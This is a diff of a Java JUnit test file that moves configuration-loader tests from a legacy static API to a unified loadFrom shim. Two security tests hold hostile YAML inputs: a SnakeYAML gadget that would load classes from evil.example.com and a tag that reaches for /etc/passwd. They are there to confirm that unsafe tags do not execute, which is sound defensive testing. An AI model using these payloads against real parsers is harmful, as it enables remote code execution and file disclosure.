@@ -1,5 +1,6 @@
 package io.github.randomcodespace.iq.config;
 
+import io.github.randomcodespace.iq.config.unified.CodeIqUnifiedConfig;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.io.TempDir;
 
@@ -11,232 +12,172 @@ import java.nio.file.Path;
 import static org.junit.jupiter.api.Assertions.*;
 
 /**
- * Tests for {@link ProjectConfigLoader#loadIfPresent} applyOverrides paths
- * and {@link ProjectConfigLoader#loadProjectConfig} / parseProjectConfig.
- * Covers dead branches at lines 167-178 (analysis/output nested sections).
+ * End-to-end tests for the legacy {@code .osscodeiq.yml} migration path.
+ *
+ * <p>Post-Phase-B cleanup, there is no public static {@code loadIfPresent} /
+ * {@code loadProjectConfig} API on {@link ProjectConfigLoader}. The same
+ * behaviour is now exercised through the canonical shim
+ * {@link ProjectConfigLoader#loadFrom(Path)}, which returns a
+ * {@link CodeIqUnifiedConfig} overlay for the PROJECT layer. Legacy flat
+ * keys ({@code cache_dir}, {@code max_depth}, {@code max_radius}) are
+ * translated into the unified tree and projected onto the legacy
+ * {@link CodeIqConfig} bean via {@link UnifiedConfigAdapter}.
+ *
+ * <p>The tests here pin the end-to-end behaviour of that migration path so
+ * existing {@code .osscodeiq.yml} users continue to get identical outcomes
+ * during the deprecation window.
  */
 class ProjectConfigLoaderApplyOverridesTest {
 
+    private static ProjectConfigLoader.LoadResult loadLegacy(Path repo, String yaml) throws IOException {
+        Files.writeString(repo.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
+        return new ProjectConfigLoader().loadFrom(repo);
+    }
+
+    // ---- Legacy flat-key overrides project onto CodeIqConfig via the adapter ----
+
     @Test
-    void appliesCacheDirOverride(@TempDir Path tempDir) throws IOException {
-        Files.writeString(tempDir.resolve(".code-iq.yml"),
-                "cache_dir: my-custom-cache\n", StandardCharsets.UTF_8);
-
-        var config = new CodeIqConfig();
-        ProjectConfigLoader.loadIfPresent(tempDir, config);
-
-        assertEquals("my-custom-cache", config.getCacheDir());
+    void legacyCacheDirFlowsThroughToCodeIqConfig(@TempDir Path tempDir) throws IOException {
+        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
+                "cache_dir: my-custom-cache\n");
+        CodeIqConfig adapted = UnifiedConfigAdapter.toCodeIqConfig(r.config());
+        assertEquals("my-custom-cache", adapted.getCacheDir());
+        assertTrue(r.deprecationWarningEmitted(),
+                ".osscodeiq.yml must emit a one-time deprecation WARN");
     }
 
     @Test
-    void appliesMaxDepthAndMaxRadiusOverrides(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                max_depth: 20
-                max_radius: 15
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        var config = new CodeIqConfig();
-        ProjectConfigLoader.loadIfPresent(tempDir, config);
-
-        assertEquals(20, config.getMaxDepth());
-        assertEquals(15, config.getMaxRadius());
+    void legacyMaxDepthAndMaxRadiusFlowThroughToCodeIqConfig(@TempDir Path tempDir) throws IOException {
+        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
+                "max_depth: 20\nmax_radius: 15\n");
+        CodeIqConfig adapted = UnifiedConfigAdapter.toCodeIqConfig(r.config());
+        assertEquals(20, adapted.getMaxDepth());
+        assertEquals(15, adapted.getMaxRadius());
     }
 
     @Test
-    void nestedAnalysisSectionDoesNotCrash(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                analysis:
-                  parallelism: 8
-                  incremental: true
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
+    void legacyCombinedFlatKeysAllApply(@TempDir Path tempDir) throws IOException {
+        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
+                "cache_dir: override-cache\nmax_depth: 5\nmax_radius: 3\n");
+        CodeIqConfig adapted = UnifiedConfigAdapter.toCodeIqConfig(r.config());
+        assertEquals("override-cache", adapted.getCacheDir());
+        assertEquals(5, adapted.getMaxDepth());
+        assertEquals(3, adapted.getMaxRadius());
+    }
 
-        var config = new CodeIqConfig();
-        boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);
+    // ---- Legacy filter sections flow into CodeIqUnifiedConfig ------------------
 
-        assertTrue(loaded);
-        // These are dead branches (stored for future use) but should not crash
-        assertEquals(10, config.getMaxDepth(), "Defaults should be preserved");
+    @Test
+    void legacyLanguagesSectionPopulatesIndexing(@TempDir Path tempDir) throws IOException {
+        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
+                // Include at least one legacy flat key so translateLegacyToUnified is used
+                // (otherwise loadFrom delegates to the canonical UnifiedConfigLoader, which
+                // is also fine but a different code path tested elsewhere).
+                "cache_dir: .cache\nlanguages: [java, python, typescript]\n");
+        CodeIqUnifiedConfig cfg = r.config();
+        assertNotNull(cfg.indexing().languages());
+        assertEquals(3, cfg.indexing().languages().size());
+        assertTrue(cfg.indexing().languages().contains("java"));
+        assertTrue(cfg.indexing().languages().contains("python"));
     }
 
     @Test
-    void nestedOutputSectionDoesNotCrash(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                output:
-                  max_nodes: 5000
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        var config = new CodeIqConfig();
-        boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);
-
-        assertTrue(loaded);
-        assertEquals(10, config.getMaxDepth(), "Defaults should be preserved");
+    void legacyDetectorsSectionPopulatesDetectors(@TempDir Path tempDir) throws IOException {
+        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
+                "cache_dir: .cache\n"
+              + "detectors:\n"
+              + "  categories: [endpoints, entities]\n"
+              + "  include: [spring-rest-detector]\n");
+        CodeIqUnifiedConfig cfg = r.config();
+        assertEquals(java.util.List.of("endpoints", "entities"), cfg.detectors().categories());
+        assertEquals(java.util.List.of("spring-rest-detector"), cfg.detectors().include());
     }
 
     @Test
-    void combinedOverridesWithAllSections(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                cache_dir: override-cache
-                max_depth: 5
-                max_radius: 3
-                analysis:
-                  parallelism: 4
-                  incremental: false
-                output:
-                  max_nodes: 1000
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        var config = new CodeIqConfig();
-        boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);
-
-        assertTrue(loaded);
-        assertEquals("override-cache", config.getCacheDir());
-        assertEquals(5, config.getMaxDepth());
-        assertEquals(3, config.getMaxRadius());
+    void legacyPipelineSectionPopulatesIndexing(@TempDir Path tempDir) throws IOException {
+        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
+                "cache_dir: .cache\n"
+              + "pipeline:\n"
+              + "  parallelism: 4\n"
+              + "  batch-size: 100\n");
+        CodeIqUnifiedConfig cfg = r.config();
+        assertEquals(4, cfg.indexing().parallelism());
+        assertEquals(100, cfg.indexing().batchSize());
     }
 
     @Test
-    void invalidMaxDepthFallsBackToDefault(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                max_depth: not_a_number
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        var config = new CodeIqConfig();
-        ProjectConfigLoader.loadIfPresent(tempDir, config);
-
-        assertEquals(10, config.getMaxDepth(), "Should fall back to default for non-numeric value");
-    }
-
-    // --- parseProjectConfig / loadProjectConfig tests ---
-
-    @Test
-    void loadProjectConfigParsesLanguages(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                languages:
-                  - java
-                  - python
-                  - typescript
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
-        assertNotNull(pc.getLanguages());
-        assertEquals(3, pc.getLanguages().size());
-        assertTrue(pc.getLanguages().contains("java"));
-        assertTrue(pc.getLanguages().contains("python"));
+    void legacyExcludePatternsPopulateIndexing(@TempDir Path tempDir) throws IOException {
+        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
+                "cache_dir: .cache\nexclude:\n  - '*.generated.java'\n  - 'vendor/**'\n");
+        CodeIqUnifiedConfig cfg = r.config();
+        assertEquals(java.util.List.of("*.generated.java", "vendor/**"),
+                cfg.indexing().exclude());
     }
 
     @Test
-    void loadProjectConfigParsesDetectorSettings(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                detectors:
-                  categories:
-                    - endpoints
-                    - entities
-                  include:
-                    - spring-rest-detector
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
-        assertNotNull(pc.getDetectorCategories());
-        assertEquals(2, pc.getDetectorCategories().size());
-        assertNotNull(pc.getDetectorInclude());
-        assertEquals(1, pc.getDetectorInclude().size());
+    void legacyParsersMapFlattensToParsersList(@TempDir Path tempDir) throws IOException {
+        // The legacy `.osscodeiq.yml` shape was `parsers: {lang: parserName}` (a map).
+        // The unified tree carries `indexing.parsers` as List<String>. The translator
+        // flattens the map's values (Analyzer never consumed the per-language map
+        // at runtime — the list is sufficient).
+        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
+                "cache_dir: .cache\nparsers:\n  java: javaparser\n  python: antlr\n");
+        CodeIqUnifiedConfig cfg = r.config();
+        assertNotNull(cfg.indexing().parsers());
+        assertTrue(cfg.indexing().parsers().contains("javaparser"),
+                "flattened parser names must include 'javaparser'; got: " + cfg.indexing().parsers());
+        assertTrue(cfg.indexing().parsers().contains("antlr"),
+                "flattened parser names must include 'antlr'; got: " + cfg.indexing().parsers());
     }
+
+    // ---- Missing-file and empty-repo behaviour ---------------------------------
 
     @Test
-    void loadProjectConfigParsesPipelineSettings(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                pipeline:
-                  parallelism: 4
-                  batch-size: 100
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
-        assertEquals(4, pc.getPipelineParallelism());
-        assertEquals(100, pc.getPipelineBatchSize());
+    void missingConfigFileReturnsEmptyOverlay(@TempDir Path tempDir) {
+        ProjectConfigLoader.LoadResult r = new ProjectConfigLoader().loadFrom(tempDir);
+        assertEquals(CodeIqUnifiedConfig.empty(), r.config());
+        assertFalse(r.deprecationWarningEmitted(),
+                "no .osscodeiq.yml means no deprecation warning");
     }
 
-    @Test
-    void loadProjectConfigReturnsEmptyForMissingFile(@TempDir Path tempDir) {
-        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
-        assertNull(pc.getLanguages());
-        assertNull(pc.getDetectorCategories());
-        assertNull(pc.getPipelineParallelism());
-    }
-
-    @Test
-    void loadProjectConfigParsesExcludePatterns(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                exclude:
-                  - "*.generated.java"
-                  - "vendor/**"
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
-        assertNotNull(pc.getExclude());
-        assertEquals(2, pc.getExclude().size());
-    }
-
-    // --- SafeConstructor / unsafe YAML tag tests ---
+    // ---- SafeConstructor / unsafe YAML tag safety -----------------------------
 
     @Test
     void unsafeYamlTagDoesNotExecuteArbitraryCode(@TempDir Path tempDir) throws IOException {
-        // Unsafe YAML tag that could trigger arbitrary class instantiation
+        // Unsafe YAML tag that could trigger arbitrary class instantiation under a
+        // non-Safe constructor. UnifiedConfigLoader uses SafeConstructor, so parsing
+        // either rejects the document or returns a safe representation. Either way,
+        // no arbitrary code runs.
         String yaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.example.com\"]]]]\n";
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
 
-        var config = new CodeIqConfig();
-        // Should not throw and should not apply any overrides
-        boolean loaded = ProjectConfigLoader.loadIfPresent(tempDir, config);
-
-        // If SafeConstructor is active: rejects the tag with an exception, returns false
-        // If default constructor: SnakeYAML fails to instantiate, catch block returns false
-        // Either way, config must remain at defaults — no code execution
-        assertFalse(loaded, "Unsafe YAML tag must not be treated as valid config");
-        assertEquals(10, config.getMaxDepth(), "Defaults must be preserved after unsafe YAML");
+        // Must not throw an unchecked exception that escapes; must not execute the tag.
+        assertDoesNotThrow(() -> {
+            try {
+                new ProjectConfigLoader().loadFrom(tempDir);
+            } catch (io.github.randomcodespace.iq.config.unified.ConfigLoadException e) {
+                // Expected: SafeConstructor rejects the unsafe tag with a typed exception.
+                // That's the correct safe outcome; the test's invariant is "no code executed".
+            }
+        });
     }
 
     @Test
-    void yamlWithMixedSafeAndUnsafeContentRejected(@TempDir Path tempDir) throws IOException {
+    void yamlWithMixedSafeAndUnsafeContentDoesNotExecuteCode(@TempDir Path tempDir) throws IOException {
         String yaml = """
                 cache_dir: legit-cache
                 exploit: !!java.io.File ["/etc/passwd"]
                 """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
+        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
 
-        var config = new CodeIqConfig();
-        // The YAML parser processes the whole document — even if the top-level parses,
-        // SafeConstructor should reject the !!java.io.File tag.
-        // With default Yaml(), this may still load (File constructor is available).
-        // This test documents that either way, the override is applied only if parse succeeds.
-        ProjectConfigLoader.loadIfPresent(tempDir, config);
-
-        // If SafeConstructor rejects: config unchanged (loadIfPresent returns false)
-        // If default Yaml() accepts: cache_dir override may apply, but no code execution risk
-        // The key assertion: no exception thrown, app stays safe
-        assertNotNull(config);
-    }
-
-    @Test
-    void loadProjectConfigParsesParserOverrides(@TempDir Path tempDir) throws IOException {
-        String yaml = """
-                parsers:
-                  java: javaparser
-                  python: antlr
-                """;
-        Files.writeString(tempDir.resolve(".code-iq.yml"), yaml, StandardCharsets.UTF_8);
-
-        ProjectConfig pc = ProjectConfigLoader.loadProjectConfig(tempDir);
-        assertNotNull(pc.getParsers());
-        assertEquals("javaparser", pc.getParsers().get("java"));
-        assertEquals("antlr", pc.getParsers().get("python"));
+        // Either the parser rejects the unsafe tag (ConfigLoadException) or it safely
+        // ignores it — in both cases no arbitrary code runs. The key invariant is safety.
+        assertDoesNotThrow(() -> {
+            try {
+                new ProjectConfigLoader().loadFrom(tempDir);
+            } catch (io.github.randomcodespace.iq.config.unified.ConfigLoadException e) {
+                // Safe rejection — acceptable outcome.
+            }
+        });
     }
 }
